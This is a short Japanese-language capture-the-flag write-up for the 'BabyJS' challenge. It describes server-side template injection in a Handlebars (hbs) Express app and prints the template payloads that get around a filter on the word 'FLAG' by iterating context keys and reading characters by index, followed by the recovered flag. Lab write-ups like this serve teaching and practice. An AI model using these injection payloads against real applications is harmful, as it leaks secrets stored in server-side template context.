## BabyJS

#### Description

```
Render me If you can.
```

#### Writeup

自分で書いた文字列をそのままレンダリングしてくれるため、うまくフラグを抜き取る問題。 `app.js` を読むと `res.render(p, { FLAG, 'apple': 'mint' });` とあるのと、`{{this}}` を送ると `[object Object]` が返ってくることから、SSTI の問題と判断。ただし `FLAG` という文字列は弾かれるようになっているため、 `{{FLAG}}` のようなことはできない。

`app.js` をさらにみると`app.engine('html', require('hbs').__express);` とあるため、テンプレートエンジンは hbs というものを使っているらしい。マニュアルを読んだものの、ロジックをあまりいれないテンプレートとなっており、 `{{"FL" + "AG"}}` みたいなこともできない。

困り果てて適当なスクリプトを送信し続けたところ、

```
{{#each this}}
{{@key}}
{{/each}}
```

という文字列を送ると、

`settings FLAG apple _locals cache` と返ってきた。

FLAG の文字列を配列として処理してくれないかな、と淡い期待をして

```
{{#each this}}
{{this.[0]}}
{{this.[1]}}
{{this.[2]}}
{{this.[3]}}
{{this.[4]}}
{{this.[5]}}
{{this.[6]}}
{{this.[7]}}
{{/each}}
```

と入力すると、

`D e f e n i t { m i n t` と返ってきた ( `m i n t` の部分は、 app.js の "apple": "mint" に該当)。

この要領で this.[i] をみていってフラグを手に入れた (リクエストが200文字を超えると弾かれるので、ちょっとずつ見る必要がある)。

`Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}`